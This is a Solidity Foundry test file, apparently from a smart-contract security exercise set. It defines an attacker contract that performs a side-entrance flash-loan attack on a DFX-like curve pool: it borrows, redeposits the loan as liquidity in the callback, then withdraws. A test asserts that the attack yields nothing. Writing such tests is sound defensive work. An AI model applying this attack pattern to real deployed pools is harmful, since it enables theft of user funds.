// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {DFXLikeCurve, DFXFlashBorrower} from "../src/35_DFXSideEntrance.sol";

contract DFXSideEntranceAttacker is DFXFlashBorrower {
    DFXLikeCurve public curve;

    constructor(DFXLikeCurve _curve) {
        curve = _curve;
    }

    function attack(uint256 amount) external {
        curve.flash(amount, this);
        curve.withdraw(curve.lpBalance(address(this)));
    }

    function dfxFlashCallback() external payable {
        curve.deposit{value: msg.value}();
    }

    receive() external payable {}
}

contract DFXSideEntranceTest is Test {
    function checkFlashLoanCannotMintWithdrawableLiquidity(uint256 flashAmount) public {
        if (flashAmount == 0 || flashAmount > 100 ether) return;

        DFXLikeCurve curve = new DFXLikeCurve();
        curve.seed{value: 100 ether}();

        DFXSideEntranceAttacker attacker = new DFXSideEntranceAttacker(curve);
        attacker.attack(flashAmount);

        assert(address(attacker).balance == 0);
    }
}
